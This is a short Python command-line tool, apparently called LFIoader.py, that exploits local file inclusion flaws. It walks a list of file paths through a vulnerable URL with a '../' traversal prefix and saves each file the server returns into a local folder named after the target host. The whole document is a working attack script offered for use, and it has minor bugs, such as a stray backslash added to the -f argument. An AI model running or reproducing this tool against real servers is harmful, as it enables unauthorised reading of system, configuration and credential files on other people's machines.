#!/usr/bin/python3

import sys
import requests
import os
import getopt
import time


def run(lfi_files,url):
    print(url)
    print(lfi_files)
    #with open('/DATA/hacking/notes/chunks/lfi-files.md', 'r') as fd:
    with open(lfi_files, 'r') as fd:
        path_list = list(fd)

    url_dir = url.split("/")[2]

    #base_path = "172.16.1.10-"+str(time.time())
    base_path = url_dir+"-"+str(time.time())
    os.makedirs(base_path)

    for path in path_list:
        path = path.strip('\n')
        r = requests.get(url+path)
        if len(r.content) > 0:
            if "/" in path:
                folder_path = path.rsplit("/",1)[0]
                file_name = path.rsplit("/",1)[1]
            elif "\\" in path:
                folder_path = path.rsplit("\\",1)[0]
                file_name = path.rsplit("\\",1)[1]
            
            if not os.path.exists(base_path+folder_path):
                os.makedirs(base_path+folder_path)
            
            with open(base_path+folder_path+"/"+file_name , 'w') as f:
                f.write(r.content.decode('utf-8'))

            print("[Succcess]["+path.strip('\n')+"]")

def main(argv):
    url = ''
    lfi_files = 'lfi-files.txt'
    
    if len(sys.argv) == 1:
        print('LFIoader.py [-f <lfi-file>] -u <url>')
        sys.exit(2)
    
    try:
        opts, args = getopt.getopt(argv,"hf:u:",["lfi_files=","url="])
    except getopt.GetoptError:
        print('LFIoader.py [-f <lfi-file>] -u <url>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('\nLFIoader.py [-f <lfi-file>] -u <url>\n')
            print('Example: LFIoader.py -u "http://10.10.10.10/lfi.php=../../../../../../.."\n', end = '')
            print('Example: LFIoader.py -f lfi-paths.txt -u "http://10.10.10.10/lfi.php=../../../../../../.."\n', end = '')
            sys.exit()
        elif opt in ("-f", "--file"):
            lfi_files = arg+"\\"
        elif opt in ("-u", "--url"):
            url = arg
     
    run(lfi_files, url)

if __name__ == "__main__":
   main(sys.argv[1:])

